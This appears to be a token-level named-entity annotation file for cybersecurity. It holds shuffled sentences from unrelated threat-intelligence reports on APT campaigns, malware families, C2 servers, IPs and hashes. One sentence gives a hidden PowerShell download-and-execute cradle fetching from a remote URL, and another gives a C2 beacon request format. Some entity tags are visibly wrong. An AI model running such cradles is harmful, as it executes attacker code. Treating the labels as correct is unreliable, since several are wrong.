POST	O
/NfLog/Nfile.asp	B-Indicator
HTTP/1.1	O
Accept	O
:	O
*/*	O
User-Agent	O
:	O
Mozilla/5.0	O
(	O
compatible	O
;	O
MSIE	O
7.0;Windows	B-Version
NT	O
5.1	B-Version
)	O
Host	O
:	O
Content-Length	O
:	O
0	O
Cache-Control	O
:	O
no-cache	O
POST	O
/NfLog/NfStart.asp?ClientId=	B-Indicator
{	O
LocalIP	O
}	O
%	O
20	O
<	O
49d0	B-Version
>	O
%	O
20	O
{	O
Ex-ternalIP	O
}	O
&	O
Nick=	O
{	O
Identifier	O
}	O
&	O
d	O
-	O
time=T:8-6-0-53	O
HTTP/1.1	O
Accept	O
:	O
*/*	O
Use-Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
6.0	O
;	O
Windows	O
NT	O
5.0	O
;	O
.NET	O
CLR	O
1.1.4322	O
)	O
Host	O
:	O
Content-Length	O
:	O
36	O
Cache-Control	O
:	O
no-cache	O
Cookie	O
:	O
ASPSESSIONIDACCARCDD=OKNPG-CKDLEKEHBOHIHLCOMHD	O

Winrar[.]be	O
site	O
with	O
'	O
recommended	O
link	O
'	O
leading	O
to	O
malicious	O
ralrab[.]com	O

Protection	O

125.214.195.17	B-Indicator
196.29.166.218	B-Indicator

Location	O
C.	O
is	O
where	O
the	O
result	O
of	O
each	O
command	O
is	O
sent	O
back	O
to	O
the	O
C	O
&	O
C	O
server	O
.	O

This	O
email	O
was	O
later	O
forwarded	O
on	O
Oct	O
24th,2016	O
from	O
a	O
spoofed	O
email	O
id	O
which	O
is	O
associated	O
with	O
Thailand	O
Indian	O
embassy	O
to	O
various	O
email	O
recipients	O
connected	O
to	O
the	O
Indian	O
Ministry	O
of	O
External	O
Affairs	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

The	O
publication	O
of	O
threat	O
information	O
allows	O
us	O
to	O
draw	O
links	O
between	O
different	O
campaigns	O
,	O
tools	O
and	O
malware	O
but	O
we	O
need	O
to	O
be	O
careful	O
about	O
which	O
links	O
we	O
consider	O
to	O
be	O
significant	O
and	O
ensure	O
we	O
're	O
confident	O
in	O
how	O
information	O
that	O
's	O
publically	O
available	O
was	O
derived	O
.	O

reconnaissance	O
associated	O
with	O
the	O
revolution	O
in	O
Ukraine	O
.	O

This	O
creates	O
a	O
quasi-capitalistic	O
system	O
that	O
pits	O
contractors	O
against	O
each	O
other	O
for	O
influence	O
with	O
the	O
Iranian	O
government	O
.	O

Of	O
particular	O
interest	O
is	O
an	O
embedded	O
,	O
custom	O
application	O
in	O
a	O
.data	O
section	O
that	O
is	O
responsible	O
for	O
loading	O
and	O
executing	O
executables	O
and	O
DLLs	O
from	O
inside	O
the	O
main	O
binary	O
.	O

An	O
additional	O
layer	O
used	O
to	O
thwart	O
detection	O
and	O
analysis	O
efforts	O
.	O

Command	O
Description	O

The	O
significance	O
of	O
the	O
username	O
Tranchulas	O
within	O
the	O
debug	O
path	O
of	O
the	O
winsocks.exe	B-Malware
binary	O
is	O
that	O
Tranchulas	O
is	O
a	O
Pakistani	O
information	O
security	O
consulting	O
company	O
with	O
offices	O
in	O
the	O
United	O
Kingdom	O
,	O
United	O
States	O
,	O
and	O
Pakistan	O
.	O

First	O
,	O
our	O
analysis	O
did	O
not	O
indicate	O
what	O
triggers	O
scada.exe	B-Malware
to	O
run	O
.	O

https://github.com/a0rtega/pafish	B-Indicator

Analysis	O
revealed	O
the	O
possibility	O
that	O
some	O
user	O
data	O
would	O
be	O
recovered	O
as	O
a	O
side	O
benefit	O
to	O
the	O
forensic	O
analysis	O
process	O
.	O

When	O
the	O
AutoIt	O
script	O
is	O
extracted	O
we	O
see	O
that	O
important	O
variables	O
are	O
base64-encoded	O
.	O

The	O
TRITON	B-Malware
sample	O
Mandiant	O
analyzed	O
added	O
an	O
attacker-provided	O
program	O
to	O
the	O
execution	O
table	O
of	O
the	O
Triconex	B-Malware
controller	O
.	O

We	O
have	O
had	O
only	O
a	O
partial	O
window	O
to	O
the	O
targets	O
of	O
these	O
semi-sophisticated	O
yet	O
highly	O
effective	O
attacks	O
.	O

Cyberkov	B-System
will	O
continue	O
investigating	O
Libyan	B-Malware
Scorpions	I-Malware
hacking	O
group	O
operating	O
in	O
Libya	O
and	O
will	O
update	O
this	O
report	O
with	O
a	O
follow-up	O
reports	O
regarding	O
any	O
future	O
cyber	O
activities	O
.	O

During	O
our	O
analysis	O
,	O
we	O
observed	O
ten	O
IP-addresses	O
used	O
by	O
the	O
Kimsuky	B-Malware
operators	O
.	O

This	O
second	O
task	O
ran	O
'	O
mshta.exe	O
'	O
every	O
50	O
minutes	O
which	O
launched	O
an	O
APT32-specific	O
backdoor	O
delivered	O
as	O
shellcode	O
in	O
a	O
PowerShell	O
script	O
,	O
configured	O
to	O
communicate	O
with	O
the	O
domains	O
blog.panggin[.]org	O
,	O
share.codehao[.]net	O
,	O
and	O
yii.yiihao126[.]net	O
.	O

Their	O
machine	O
is	O
running	O
Windows	B-System
7	O
Professional	O
Service	O
Pack	O
1	O
.	O

We	O
have	O
named	O
them	O
Retro	B-Malware
and	O
Collector	B-Malware
by	O
the	O
PDB	O
path	O
extracted	O
from	O
the	O
program	O
.	O

This	O
middle	O
tier	O
translated	O
intelligence	O
priorities	O
into	O
segmented	O
cyber	O
tasks	O
which	O
were	O
then	O
bid	O
out	O
to	O
multiple	O
contractors	O
.	O

Pussy	O
Riot	O
AUGUST	O
2015	O
APT28	O
targets	O
Russian	O
rockers	O
and	O
dissidents	O
Pussy	O
Riot	O
via	O
spear-phishing	O
emails	O
.	O

The	O
document	O
bears	O
the	O
filename	O
'	O
2018-PHIẾU	O
GHI	O
DANH	O
THAM	O
DỰ	O
TĨNH	O
HỘI	O
HMDC	O
2018.doc	O
,	O
'	O
which	O
translates	O
to	O

McAfee	B-Organization
Network	B-System
Security	O
Platform	O
McAfee	B-Organization
Network	B-System
Security	O
Platform	O
versions	O
with	O
Artemis	O
enabled	O
(	O
6.0.x	B-Version
)	O
provide	O
coverage	O
for	O
this	O
malware	O
.	O

We	O
believe	O
the	O
infection	O
vector	O
for	O
all	O
of	O
the	O
attacks	O
involved	O
in	O
this	O
campaign	O
are	O
macro-based	O
documents	O
sent	O
as	O
an	O
email	O
attachment	O
.	O

d	O
.	O

Figure	O
14	O
:	O
China	B-Malware
Chopper	I-Malware
file	O
properties	O

In	O
June	O
2014	O
,	O
Arbor	O
Networks	O
published	O
an	O
article	O
describing	O
the	O
RIPTIDE	B-Malware
backdoor	O
and	O
its	O
C2	O
infrastructure	O
in	O
great	O
depth	O
.	O

C2	O
Domain	O
Information	O

In	O
this	O
campaign	O
,	O
the	O
threat	O
actor	O
's	O
tactics	O
,	O
techniques	O
and	O
procedures	O
(	O
TTPs	O
)	O
shifted	O
after	O
about	O
a	O
month	O
,	O
as	O
did	O
their	O
targets	O
.	O

The	O
algorithm	O
is	O
as	O
follows	O
:	O

However	O
,	O
various	O
provisions	O
of	O
the	O
accord	O
expire	O
at	O
different	O
times	O
over	O
the	O
next	O
25	O
years	O
,	O
with	O
some	O
expiring	O
as	O
soon	O
as	O
2025	O
.	O

66DDF27517985A75B2317231B46A6F62	B-Indicator
natco1.no-ip.net	B-Indicator
US	O

Those	O
commands	O
(	O
103	O
,	O
104	O
and	O
105	O
)	O
correspond	O
to	O
the	O
following	O
list	O
of	O
commands	O
defined	O
in	O
the	O
malware	O
:	O
Each	O
number	O
corresponds	O
to	O
one	O
command	O
to	O
be	O
done	O
by	O
the	O
malware	O
.	O

On	O
execution	O
,	O
the	O
Java	O
code	O
downloaded	O
a	O
ZIP	O
archive	O
from	O
a	O
cloud	O
file	O
hosting	O
site	O
such	O
as	O
Google	O
Drive	O
,	O
Dropbox	O
,	O
or	O
Github	O
.	O

Cobalt	B-System
Strike	O
is	O
the	O
business	O
version	O
of	O
Armitage	O
which	O
is	O
the	O
penetration	O
testing	O
software	O
of	O
Metasploit	O
figure	O
interface	O
written	O
by	O
Java	O
.	O

Microphone	O
:	O
Captures	O
audio	O
conversations	O
.	O

27	O
,	O
2018	O
,	O
to	O
March	O
5	O
,	O
2018	O
)	O
used	O
a	O
new	O
variant	O
of	O
the	O
macro	O
that	O
does	O
not	O
use	O
VBS	O
for	O
PowerShell	O
code	O
execution	O
.	O

The	O
technique	O
of	O
hosting	O
malicious	O
code	O
in	O
a	O
university	O
site	O
(	O
legitimate	O
site	O
)	O
has	O
advantages	O
and	O
it	O
is	O
unlikely	O
to	O
trigger	O
any	O
suspicion	O
in	O
security	O
monitoring	O
and	O
also	O
can	O
bypass	O
reputation	O
based	O
devices	O
.	O

www.symantec.com	B-Indicator

Earlier	O
this	O
year	O
,	O
we	O
deployed	O
new	O
technologies	O
in	O
Kaspersky	O
Lab	O
products	O
to	O
identify	O
and	O
block	O
zero-day	O
attacks	O
.	O

Provider=	O
or	O
Driver=	O
-	O
Will	O
connect	O
using	O
the	O
OleDbConnection	O
class	O
.	O

Check	O
the	O
infographic	O
Homemade	O
Browser	O
Targeting	O
Banco	B-System
do	O
Brasil	O
Users	O
Campaign	O
Possibly	O
Connected	O
to	O
'	O
MuddyWater	O
'	O
Surfaces	O
in	O
the	O
Middle	O
East	O
and	O
Central	O
Asia	O
Cryptocurrency	O
Miner	O
Distributed	O
via	O
PHP	O
Weathermap	O
Vulnerability	O
,	O
Targets	O
Linux	O
Servers	O
Monero-Mining	B-Malware
HiddenMiner	I-Malware
Android	O
Malware	O
Can	O
Potentially	O
Cause	O
Device	O
Failure	O
Cryptocurrency-Mining	B-Malware
Malware	O
:	O
2018	O
's	O
New	O
Menace	O
?	O

Another	O
characteristic	O
in	O
common	O
to	O
the	O
previous	B-Version
files	O
is	O
that	O
,	O
this	O
one	O
is	O
written	O
in	O
Delphi	O
programming	O
language	O
,	O
like	O
also	O
the	O
four	O
initial	O
file	O
droppers	O
.	O

Visibly	O
,	O
this	O
RAT	B-Malware
was	O
used	O
alongside	O
the	O
Uroburos	B-Malware
rootkit	I-Malware
.	O

Our	O
latest	O
findings	O
give	O
an	O
updated	O
look	O
at	O
the	O
global	O
proliferation	O
of	O
FinSpy	B-Malware
.	O

Files	O
used	O
by	O
malware	O
:	O

The	O
malicious	O
macro	O
code	O
first	O
decodes	O
a	O
string	O
which	O
contains	O
a	O
reference	O
to	O
the	O
pastebin	O
url	O
.	O

Computer	O
name	O
(	O
'	O
ComputerNamePhysicalDnsFullyQualified	O
'	O
)	O
.	O

This	O
is	O
the	O
first	O
ever	O
Portuguese­speaking	O
targeted	O
attack	O
campaign	O
.	O

Several	O
techniques	O
are	O
employed	O
for	O
executing	O
the	O
PowerShell	O
code	O
:	O
If	O
command	O
starts	O
with	O
'	O
excel	O
'	O
,	O
then	O
it	O
leverages	O
DDEInitiate	O
Method	O
of	B-System
Excel.Appilcation	O
to	O
execute	O
the	O
code	O
:	O
If	O
the	O
command	O
starts	O
with	O
'	O
outlook	O
'	O
,	O
then	O
it	O
leverages	O
Outlook.Application	O
and	O
MSHTA	O
to	O
execute	O
the	O
code	O
:	O
If	O
the	O
command	O
starts	O
with	O
'	O
risk	O
'	O
,	O
then	O
execution	O
is	O
performed	O
through	O
DCOM	O
object	O
:	O
File	O
upload	O
functionality	O
.	O

It	O
is	O
worth	O
noting	O
that	O
this	O
email	O
appeared	O
to	O
have	O
been	O
sent	O
from	O
another	O
Taiwanese	O
Government	O
employee	O
,	O
implying	O
that	O
the	O
email	O
was	O
sent	O
from	O
a	O
valid	O
but	O
compromised	O
account	O
.	O

Last	O
accessed	O
August	O
30	O
,	O
2013.	O
accessed	O
August	O
30	O
,	O
2013	O
.	O

http://download.nai.com/products/mcafee-avert/aurora_stinger.exe	B-Indicator

The	O
dropper	O
shares	O
the	O
same	O
decoding	O
functions	O
as	O
the	O
DLL	O
and	O
performs	O
some	O
modifications	O
on	O
the	O
DLL	O
that	O
will	O
be	O
described	O
later	O
.	O

Back	O
in	O
May	O
2011	O
,	O
Kaspersky	O
Lab	O
reported	O
the	O
website	O
was	O
being	O
leveraged	O
to	O
target	O
users	O
with	O
Flash	O
Exploits	O
.	O

In	O
the	O
case	O
of	O
'	O
Uranio2011	O
'	O
,	O
the	O
subdomain	O
is	O
simply	O
'	O
uranio	O
'	O
and	O
2011	O
represents	O
the	O
port	O
number	O
used	O
to	O
communicate	O
with	O
the	O
CnC	O
infrastructure	O
.	O

After	O
decryption	O
,	O
the	O
exploit	O
payload	O
is	O
loaded	O
and	O
triggered	O
to	O
allow	O
for	O
follow-on	O
code	O
execution	O
.	O

The	O
crawls	O
were	O
observed	O
throughout	O
our	O
data	O
period	O
from	O
early	O
March	O
continuing	O
right	O
through	O
to	O
the	O
end	O
of	O
April	O
,	O
suggesting	O
a	O
strong	O
,	O
persistent	O
interest	O
in	O
this	O
particular	O
site	O
.	O

The	O
attackers	O
created	O
persistence	O
using	O
Windows	B-System
'	O
registry	O
,	O
services	O
and	O
scheduled	O
tasks	O
.	O

Take	O
advantage	O
of	O
anti-phishing	O
features	O
offered	O
by	O
your	O
email	O
client	O
and	O
web	O
browser	O
.	O

In	O
addition	O
,	O
the	O
language	O
localization	O
settings	O
found	O
in	O
few	O
of	O
the	O
payloads	O
suggest	O
that	O
the	O
malware	O
authors	O
compiled	O
the	O
payloads	O
on	O
machines	O
with	O
Asian	O
languages	O
support	O
.	O

page	O
|	O
18	O

Working	O
in	O
concert	O
with	O
traditional	O
network	O
defense	O
appliances	O
that	O
currently	O
reside	O
in	O
our	O
client	O
's	O
proprietary	O
network	O
,	B-Organization
root9B	O
's	O
HUNT	O
platform	O
delivers	O
a	O
pro-active	O
defense	O
protection	O
capability	O
to	O
identify	O
,	O
pursue	O
,	O
and	O
mitigate	O
cyber	O
threats	O
.	O

The	O
campaign	O
was	O
highly	O
targeted	O
and	O
ran	O
deep	O
under	O
the	O
radar	O
.	O

That	O
,	O
combined	O
with	O
domain	O
registration	O
information	O
,	O
leads	O
to	O
at	O
least	O
one	O
potential	O
actor	O
,	O
Peng	O
Yong	O
.	O

unsigned	O
long	O
long	O
param_size	O
;	O

Function	O
EncryptAndSendData_sub_49393C	O
(	O
)	O

The	O
C++	O
structure	O
of	O
this	O
280kb+	O
dll	O
is	O
familiar	O
SPLM/CHOPSTICK	B-Malware
,	O
but	O
it	O
maintains	O
a	O
completely	O
different	O
cipher	O
for	O
decrypting	O
configuration	O
data	O
and	O
error	O
messages	O
,	O
etc	O
.	O

International	O
monitoring	O
groups	O
later	O
assessed	O
some	O
of	O
the	O
attacks	O
were	O
likely	O
to	O
have	O
come	O
from	O
inside	O
Russian	O
territory	O
.	O

•	O
A	O
common	O
quartermaster	O
or	O
supply-chain	O
for	O
their	O
malware	O
tools	O
.	O

The	O
malware	O
begins	O
by	O
creating	O
a	O
new	O
thread	O
from	O
the	O
DllMain	B-Indicator
(	O
)	O
function	O
to	O
carry	O
out	O
its	O
malicious	O
activities	O
:	O
New	O
thread	O
created	O
in	O
the	O
malware	O
's	O
DllMain	O
(	O
)	O
function	O
.	O

$	O
2='-nop	O
-w	B-Version
hidden	O
-exec	B-Version
bypass	O
-c	B-Version
'	O
IEX	O
(	O
New-Object	O
System.Net.Webclient	O
)	O
.DownloadString	O
(	O
'	O
'	O
https://goo(.)gl/cpT1NW''	O
)	O
'	O
'	O
;	O
if	O
(	O
[	O
IntPtr	O
]	O
:	O
:Size	O
-eq	O
8	O
)	O
{	O
$	O
3	O
=	O
$	O
env	O
:	O
SystemRoot	O
+	O
'	O
\syswow64\WindowsPowerShell\v1.0\powershell';iex	O
'	O
&	O
$	O
3	O
$	O
2	O
'	O
;	O
}	O
else	O
{	O
iex	O
'	O
&	O
powershell	O
$	O
2	O
'	O
;	O
}	O

<	O
Windows	B-System
Version	O
number	O
>	O
@	O
@	O
<	O
CPU	O
Architecture	O
(	O
2	O
for	O
x64	O
,	O
1	O
for	O
x86	O
)	O
>	O
?	O
?	O

Next	O
,	O
we	O
will	O
go	O
through	O
what	O
we	O
believe	O
is	O
the	O
development	O
life	O
cycle	O
and	O
feature-addition	O
mission	O
carried	O
out	O
by	O
this	O
developer	O
.	O

Symantec	B-Organization
reserves	O
the	O
right	O
to	O
make	O
changes	O
without	O
prior	O
notice	O
.	O

The	O
recently	O
published	O
FBI	B-Organization
flash	O
alert	O
#	O
A-000049-MW	O
,	O
cited	O
domain	O
names	O
previously	O
referenced	O
in	O
our	O
blog	O
as	O
being	O
related	O
to	O
an	O
actor	O
known	O
as	O
Deep	O
Panda	O
,	O
which	O
we	O
'll	O
get	O
to	O
in	O
a	O
minute	O
.	O

The	O
search	O
was	O
performed	O
for	O
the	O
hex	O
of	O
the	O
VBR	O
file	O
header	O
,	O
EB	O
52	O
90	O
4E	O
54	O
46	O
53	O
(	O
ëR	O
NTFS	O
)	O
.	O

Therefore	O
,	O
foreign	O
institutions	O
within	O
China	O
would	O
be	O
identified	O
as	O
coming	O
from	O
China	O
;	O
the	O
same	O
would	O
hold	O
true	O
for	O
all	O
countries	O
.	O

Even	O
this	O
oldest	O
main	O
component	O
does	O
however	O
use	O
XML	O
for	O
other	O
purposes	O
via	O
the	O
open-source	O
Pugi-XML	O
library	O
.	O

The	O
propensity	O
to	O
target	O
these	O
industries	O
possibly	O
demonstrates	O
an	O
interest	O
in	O
gaining	O
economic	O
competitive	O
advantage	O
in	O
the	O
region	O
through	O
the	O
acquisition	O
of	O
trade	O
secrets.using	O
the	O
appropriate	O
language	O
for	O
each	O
of	O
their	O
targets	O
in	O
the	O
phishing	O
emails–	O
such	O
as	O
Japanese	O
and	O
traditional	O
Chinese	O
(	O
mainly	O
used	O
in	O
Taiwan	O
)	O
.	O

T	O
he	O
findings	O
of	O
the	O
analysis	O
of	O
compromised	O
servers	O
and	O
the	O
attackers	O
'	O
activity	O
on	O
these	O
servers	O
are	O
as	O
follows	O
:	O
1	O
.	O

Above	O
:	O
Infrastructure	O
map	O
.	O

Given	O
the	O
similarities	O
in	O
methodology	O
and	O
targeting	O
we	O
consider	O
it	O
highly	O
likely	O
that	O
the	O
current	O
attack	O
malware	O
and	O
the	O
Hangover	O
infrastructures	O
are	O
related	O
.	O

In	O
the	O
digital	O
age	O
,	O
a	O
strategic	O
web	O
compromise	O
(	O
exploit	O
drive-by	O
)	O
has	O
become	O
a	O
key	O
weapon	O
of	O
choice	O
for	O
to	O
conduct	O
such	O
operations	O
.	O

This	O
was	O
the	O
second	O
public	O
Iranian	O
attack	O
campaign	O
on	O
an	O
American	O
business	O
,	O
where	O
the	O
response	O
called	O
for	O
speed	O
over	O
time	O
and	O
preparation	O
.	O

A	O
process	O
created	O
as	O
logged-in	O
user	O
.	O

In	O
our	O
never-ending	O
quest	O
to	O
spot	O
and	O
expose	O
the	O
nastiest	O
of	O
the	O
Internet	O
,	O
me	O
and	O
Mark	O
this	O
time	O
incidentally	O
stepped	O
into	O
a	O
targeted	O
attacks	O
campaign	O
apparently	O
directed	O
at	O
a	O
distributed	O
and	O
diversified	O
base	O
of	O
victims	O
.	O

From	O
late	O
2014	O
and	O
through	O
2016	O
,	O
FANCY	O
BEAR	O
X-Agent	B-Malware
implant	O
was	O
covertly	O
distributed	O
on	O
Ukrainian	O
military	O
forums	O
within	O
a	O
legitimate	O
Android	O
application	O
developed	O
by	O
Ukrainian	O
artillery	O
officer	O
Yaroslav	O
Sherstuk	O
.	O

이	O
밖에도	O
특정	O
산	O
업	O
분야에서	O
사용되는	O
시스템과	O
관련된	O
소프트웨어의	O
취약점을	O
이용한	O
공격을	O
진행했다	O
.	O

In	O
mid-February	O
this	O
year	O
,	O
we	O
discovered	O
a	O
new	O
Mac	O
sample	O
that	O
appeared	O
to	O
be	O
the	O
Mac	O
version	O
of	O
the	O
APT28	B-Malware
XAgent	I-Malware
component	O
.	O

In	O
the	O
implementation	O
process	O
,	O
Retro	B-Malware
disguised	O
fake	O
SSH	O
and	O
fake	O
zlib	O
,	O
intended	O
to	O
obfuscate	O
and	O
interfere	O
with	O
users	O
and	O
analysts	O
.	O

If	O
you	O
believe	O
that	O
you	O
are	O
being	O
targeted	O
it	O
pays	O
to	O
be	O
especially	O
cautious	O
when	O
downloading	O
files	O
over	O
the	O
Internet	O
,	O
even	O
from	O
links	O
that	O
are	O
purportedly	O
sent	O
by	O
friends	O
.	O

The	O
Komplex	B-Malware
Dropper	I-Malware
:	O
Its	O
main	O
functionality	O
is	O
to	O
drop	O
a	O
third	O
Komplex	B-Malware
component	O
:	O
the	O
final	O
payload	O
,	O
and	O
ensure	O
persistence	O
on	O
the	O
infected	O
system	O

The	O
embedded	O
binary	O
objects	O
in	O
the	O
lure	O
documents	O
contained	O
a	O
trailing	O
'	O
fdp.scr	O
'	O
in	O
their	O
names	O
with	O
a	O
special	O
invisible	O
Unicode	O
character	O
.	O

As	O
has	O
been	O
detailed	O
above	O
,	O
the	O
wipe	O
function	O
will	O
overwrite	O
data	O
within	O
the	O
Documents	O
and	O
Settings	O
folder	O
followed	O
by	O
the	O
System32	O
folder	O
,	O
and	O
then	O
it	O
will	O
start	O
the	O
physical	O
disk	O
access	O
and	O
start	O
the	O
wiping	O
at	O
the	O
disk	O
level	O
.	O

Hash	O

The	O
initial	O
process	O
,	O
AYRUNSC.exe	O
,	O
is	O
unable	O
to	O
work	O
correctly	O
and	O
will	O
therefore	O
exit	O
.	O

(	O
where	O
?	O
?	O
?	O

86BE5F0D2303FB4A8A8E297A53AC0026	B-Indicator
lokia.mine.nu	B-Indicator

Figure	O
3	O
:	O
URL	O
Shortener	O
Redirects	O
to	O
Github	O
Link	O

Lacking	O
cryptographic	O
verification	O
facilitates	O
file	O
replacement	O
and	O
MitM	O
attacks	O
against	O
controlled	O
industrial	O
processes	O
.	O

The	O
modus	O
operandi	O
and	O
tools	O
served	O
as	O
behavioral	O
fingerprints	O
also	O
played	O
an	O
important	O
role	O
in	O
tying	O
Operation	O
Cobalt	B-System
Kitty	O
to	O
the	O
OceanLotus	O
Group	O
.	O

Protecting	O
Users	O
from	O
These	O
Threats	O

World	O
Anti-Doping	O
Agency	O
.	O

We	O
observed	O
several	O
different	O
spear-phishing	O
documents	O
that	O
drop	O
uniquely	O
named	O
payloads	O
.	O

Once	O
ANEL	B-Malware
enters	O
the	O
user	O
's	O
system	O
,	O
it	O
will	O
download	O
various	O
tools	O
that	O
could	O
be	O
used	O
for	O
malicious	O
purposes	O
,	O
including	O
password	O
retrieval	O
tools	O
as	O
well	O
as	O
malicious	O
mail	O
services	O
and	O
accessibility	O
tools	O
that	O
will	O
allow	O
it	O
to	O
gather	O
information	O
about	O
the	O
system	O
.	O

9/10	B-Version

As	O
with	O
other	O
Animal	B-System
Farm	O
binaries	O
,	O
it	O
bears	O
the	O
mark	O
of	O
professional	O
and	O
experienced	O
developers	O
.	O

The	O
unique	O
ID	O
of	O
the	O
infected	O
machine	O
(	O
computer	O
name	O
+	O
HD	O
serial	O
3	O
.	O

This	O
verdict	O
was	O
supposed	O
to	O
correspond	O
to	O
the	O
known	O
file	O
mrxcls.sys	O
described	O
above	O
,	O
but	O
the	O
detected	O
file	O
's	O
name	O
and	O
checksum	O
were	O
different	O
!	O

This	O
path	O
was	O
confirmed	O
as	O
a	O
static	O
location	O
in	O
the	O
code	O
that	O
the	O
backdoor	O
would	O
use	O
to	O
copy	O
itself	O
.	O

5	O

Specific	O
examples	O
include	O
Shahid	B-System
Beheshti	O
University	O
(	O
SBU	O
)	O
and	O
the	O
Imam	B-System
Hossein	O
University	O
(	O
IHU	O
)	O
,	O
which	O
have	O
comprehensive	O
science	O
and	O
technology	O
departments	O
attracting	O
some	O
of	O
the	O
best	O
academic	O
talent	O
in	O
Iran	O
.	O

But	O
not	O
in	O
this	O
case	O
-	O
at	O
the	O
time	O
of	O
writing	O
,	O
the	O
gathered	O
user	O
information	O
variable	O
which	O
should	O
point	O
to	O
the	O
xmlrwbin.inc	O
filename	O
has	O
not	O
yet	O
been	O
initialized	O
,	O
causing	O
the	O
file	O
write	O
to	O
fail	O
.	O

They	O
share	O
similarities	O
in	O
code	O
–	O
take	O
a	O
look	O
at	O
the	O
function	O
that	O
generates	O
the	O
BOTID-value	O
,	O
for	O
example	O
:	O
The	O
BOTID-value	O
is	O
a	O
unique	O
value	O
generated	O
on	O
the	O
basis	O
of	O
the	O
hardware	O
parameters	O
of	O
infected	O
computer	O
,	O
and	O
it	O
's	O
used	O
by	O
attackers	O
for	O
computer	O
identification	O
.	O

Such	O
network	O
topology	O
is	O
typical	O
for	O
companies	O
and	O
enterprises	O
.	O

DFS.BAT	O
,	O
etc	O
)	O
.	O

The	O
following	O
pages	O
display	O
some	O
of	O
the	O
bait	O
information	O
the	O
new	O
files	O
contain	O
.	O

Command	O
Description	O

According	O
to	O
the	O
analysis	O
published	O
on	O
malwr.com	B-Indicator
,	O
this	O
file	O
was	O
originally	O
named	O
'	O
Israel	O
Homeland	O
Defense	O
Directory	O
2015	O
_Secured_.exe	O
'	O
and	O
,	O
once	O
executed	O
,	O
the	O
following	O
decoy	O
document	O
was	O
presented	O
:	O
The	O
initial	O
file	O
in	O
this	O
case	O
is	O
a	O
self­extracting	O
RAR	O
file	O
that	O
contains	O
three	O
components	O
,	O
including	O
a	O
decoy	O
document	O
(	O
in	O
this	O
case	O
,	O
the	O
PDF	O
shown	O
above	O
)	O
and	O
the	O
malware	O
.	O

Function	O
PreProcess_sub_44C1C0	O
(	O
)	O

In	O
late	O
May	O
2013	O
,	O
TCIRT	O
identified	O
a	O
malicious	O
file	O
hosted	O
at	O
http[:]//199.91.173[.]43/new_salary/salary_revision.scr	B-Indicator
(	O
Kansas	O
City	O
,	O
Missouri	O
)	O
.	O

System	O
Infected	O
:	O
Backdoor.Remexi	B-Malware
Activity	O
(	O
http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=28967	B-Indicator
)	O

Dropper	O
icon	O
Russian	O
social	O
media	O
site	O
from	O
where	O
icon	O
for	O
dropper	O
EXE	O
was	O
obtained	O

It	O
then	O
downloads	O
further	O
components	O
.	O

The	O
embedded	O
file	O
(	O
MD5	O
:	O
75D3D1F23628122A64A2F1B7EF33F5CF	B-Version
)	O
,	O
later	O
written	O
to	O
disk	O
as	O
adobe.dat	O
,	O
is	O
obfuscated	O
with	O
a	O
double	O
XOR	O
loop	O
with	O
keys	O
0x2C	O
and	O
0x7B	O
(	O
this	O
is	O
mathematically	O
equivalent	O
to	O
a	O
single	O
XOR	O
loop	O
with	O
the	O
byte	O
key	O
0x57	O
)	O
.	O

Information	O
about	O
installed	O
Windows	B-System
updates	B-Version
from	O
the	O
file	O

From	O
August	O
to	O
October	O
,	O
Guccifer	O
2.0	O
posted	O
several	O
additional	O
installments	O
of	O
what	O
appear	O
to	O
be	O
internal	O
DCCC	O
documents	O
on	O
'	O
his	O
'	O
WordPress	O
site	O
.	O

2016	O
.	O

Targeting	O
in	O
Hebrew	O
and	O
English	O

The	O
winrar[.]be	O
site	O
evaluated	O
what	O
'	O
recommended	O
'	O
package	O
a	O
visitor	O
may	O
need	O
based	O
on	O
browser	O
localization	O
and	O
processor	O
capability	O
,	O
and	O
accordingly	O
offered	O
up	O
appropriate	O
trojanized	O
versions	O
.	O

본	O
보고서에서는	O
안다리엘	O
공격	O
그룹의	O
공격	O
방식	O
,	O
주요	O
공격	O
사례를	O
살펴보고	O
,	O
공격	O
대상의	O
변화와	O
목적에	O
대해	O
알아본다	O
.	O

Both	O
pieces	O
of	O
malware	O
look	O
for	O
a	O
single	O
,	O
highly	O
specific	O
process	O
.	O

CWS	O
or	O
WSA	O
web	O
scanning	O
prevents	B-Version
access	O
to	O
malicious	O
websites	O
and	O
detects	O
malware	O
used	O
in	O
these	O
attacks	O
.	O

However	O
,	O
this	O
key	O
is	O
also	O
scrambled	O
with	O
operation	O
XOR	O
0x13	O
followed	O
by	O
ROL	O
6	O
operation	O
applied	O
to	O
each	O
byte	O
.	O

We	O
have	O
seen	O
attempts	O
to	O
attack	O
various	O
companies	O
in	O
Russia	O
and	O
Ukraine	O
using	O
spearphishing	O
e-mails	O
that	O
have	O
malicious	O
attachments	O
consisting	O
of	O
.SCR	O
files	O
or	O
.RTF	O
exploits	O
.	O

Retrieves	O
the	O
server	O
time	O
Deletes	O
the	O
downloaded	O
victim	O
profiles	O
Deletes	O
the	O
connection	O
log	O
files	O
if	O
they	O
were	O
already	O
downloaded	O
Posts	O
a	O
job	O
to	O
kill	O
the	O
backdoor	O
Posts	O
a	O
job	O
for	O
DLL	O
injection	O
Changes	O
the	O
sleep	O
interval	O
Posts	O
a	O
job	O
for	O
command	O
shell	O
execution	O
Retrieves	O
the	O
job	O
results	O
and	O
deletes	O
the	O
posted	O
Posts	O
a	O
job	O
for	O
all	O
the	O
backdoors	O
connecting	O
to	O
the	O
server	O

Function	O
DecryptResources_sub_49F92C	B-Indicator
(	O
)	O

Figure	O
4	O
:	O
Contents	O
of	O
HTA	O
File	O

Asset	O
owners	O
who	O
wish	O
to	O
defend	O
against	O
the	O
capabilities	O
demonstrated	O
in	O
the	O
incident	O
,	O
should	O
consider	O
the	O
following	O
controls	O
:	O
Where	O
technically	O
feasible	O
,	O
segregate	O
safety	O
system	O
networks	O
from	O
process	O
control	O
and	O
information	O
system	O
networks	O
.	O

This	O
variant	O
sends	O
the	O
system	O
info	O
to	O
the	O
controller	O
in	O
clear	O
text	O
for	O
the	O
login	O
request	O
.	O

It	O
was	O
n't	O
until	O
August	O
2014	O
that	O
we	O
observed	O
something	O
which	O
made	O
us	O
wonder	O
if	O
RedOctober	B-Malware
is	O
back	O
for	O
good	O
.	O

This	O
threat	O
advisory	O
describes	O
the	O
functionality	O
of	O
the	O
three	O
malware	O
files	O
to	O
include	O
command	O
inputs	O
and	O
the	O
resulting	O
